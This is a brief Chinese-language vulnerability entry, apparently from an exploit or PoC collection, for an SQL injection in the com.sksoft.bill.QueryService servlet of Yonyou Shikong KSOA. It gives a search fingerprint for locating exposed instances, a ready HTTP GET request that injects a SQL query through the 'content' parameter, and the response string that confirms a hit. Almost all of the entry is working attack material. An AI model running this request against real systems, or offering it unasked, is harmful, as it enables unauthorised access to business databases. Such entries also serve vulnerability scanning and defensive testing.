# 用友时空KSOAcom.sksoft.bill.QueryServiceSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','123')) HTTP/1.1`
- **响应特征**：200 ac59075b964b0715